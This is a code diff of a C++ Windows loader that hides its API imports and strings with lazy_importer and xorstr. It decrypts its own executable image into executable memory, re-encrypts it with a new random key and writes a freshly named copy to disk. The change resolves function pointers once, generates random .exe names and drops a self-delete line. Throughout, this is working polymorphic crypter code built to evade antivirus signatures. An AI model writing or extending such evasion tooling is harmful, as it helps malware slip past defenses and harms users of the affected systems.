@@ -8,7 +8,7 @@
 // #define DEBUG
 
 #ifdef DEBUG
-#define ERROR_MESSAGE(message) LI_FN(MessageBoxA)(nullptr, xorstr_(message), xorstr_("Error"), MB_OK | MB_ICONERROR)
+#define ERROR_MESSAGE(message) fnMessageBoxA(nullptr, xorstr_(message), xorstr_("Error"), MB_OK | MB_ICONERROR)
 #else
 #define ERROR_MESSAGE(message)
 #endif
@@ -37,8 +37,24 @@ __forceinline void inline_memcpy(PVOID dest, PVOID src, SIZE_T size) {
 }
 
 extern "C" int initial_loader(ULONG_PTR xorKey) {
+    auto fnGetModuleHandleA = LI_FN(GetModuleHandleA).get();
+    auto fnVirtualAlloc = LI_FN(VirtualAlloc).get();
+    auto fnGetTickCount64 = LI_FN(GetTickCount64).get();
+    auto fnRtlRandomEx = LI_FN(RtlRandomEx).get();
+    auto fnCreateFileA = LI_FN(CreateFileA).get();
+    auto fnWriteFile = LI_FN(WriteFile).get();
+    auto fnCloseHandle = LI_FN(CloseHandle).get();
+    auto fnExitProcess = LI_FN(ExitProcess).get();
+#ifdef DEBUG
+    // user32.dll is not loaded by default by windows, so we need to load it manually
+    LI_FN(LoadLibraryA)(xorstr_("user32.dll"));
+    auto fnMessageBoxA = LI_FN(MessageBoxA).get();
+#else
+    #define fnMessageBoxA(a, b, c, d)
+#endif
+
     // get module base
-    ULONG_PTR base = (ULONG_PTR)LI_FN(GetModuleHandleA)(nullptr);
+    ULONG_PTR base = (ULONG_PTR)fnGetModuleHandleA(nullptr);
 
     // parse the headers
     auto nt_headers = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
@@ -58,7 +74,7 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
     }
 
     // allocate memory for new executable
-    auto new_image_base = (ULONG_PTR)LI_FN(VirtualAlloc)(nullptr, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    auto new_image_base = (ULONG_PTR)fnVirtualAlloc(nullptr, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!new_image_base) {
         ERROR_MESSAGE("Failed to allocate memory for new executable");
         return 1;
@@ -82,8 +98,7 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
     }
 
     // generate a new random xor key
-    ULONG seed = (ULONG)LI_FN(GetTickCount64)();
-    auto fnRtlRandomEx = LI_FN(RtlRandomEx);
+    ULONG seed = (ULONG)fnGetTickCount64();
     ULONG_PTR new_xor_key = (ULONG_PTR)fnRtlRandomEx(&seed) | ((ULONG_PTR)fnRtlRandomEx(&seed) << 32);
 
     // re-encrypt all sections in new executable
@@ -153,10 +168,17 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
 
     // generate a random file name
     char file_name[MAX_PATH];
-    LI_FN(GetTempFileNameA)(xorstr_("."), nullptr, 0, file_name);
+    for (int i = 0; i < 16; i++) {
+        file_name[i] = (char)(fnRtlRandomEx(&seed) % 26 + 'a');
+    }
+    file_name[16] = '.';
+    file_name[17] = 'e';
+    file_name[18] = 'x';
+    file_name[19] = 'e';
+    file_name[20] = '\0';
 
     // open file for the new executable
-    auto file_handle = LI_FN(CreateFileA)(file_name, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    auto file_handle = fnCreateFileA(file_name, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
     if (file_handle == INVALID_HANDLE_VALUE) {
         ERROR_MESSAGE("Failed to open file for new executable");
         return 4;
@@ -164,25 +186,22 @@ extern "C" int initial_loader(ULONG_PTR xorKey) {
 
     // write new executable to disk
     DWORD bytes_written = 0;
-    if (!LI_FN(WriteFile)(file_handle, (PVOID)new_image_base, FileSize, &bytes_written, nullptr)) {
+    if (!fnWriteFile(file_handle, (PVOID)new_image_base, FileSize, &bytes_written, nullptr)) {
         ERROR_MESSAGE("Failed to write new executable to disk");
         return 5;
     }
 
     // close file handle
-    LI_FN(CloseHandle)(file_handle);
+    fnCloseHandle(file_handle);
 
     if (bytes_written != FileSize) {
         ERROR_MESSAGE("Failed to write entire new executable to disk");
         return 6;
     }
 
-    // delete original executable
-    LI_FN(DeleteFileA)(LI_FN(GetCommandLineA)());
-
     // display message box
-    // LI_FN(MessageBoxA)(nullptr, xorstr_("WORKS!"), xorstr_("WORKS"), MB_OK | MB_ICONERROR);
+    fnMessageBoxA(nullptr, xorstr_("WORKS!"), xorstr_("WORKS"), MB_OK | MB_ICONINFORMATION);
 
-    LI_FN(ExitProcess)(0);
+    fnExitProcess(0);
     return 0;
 }
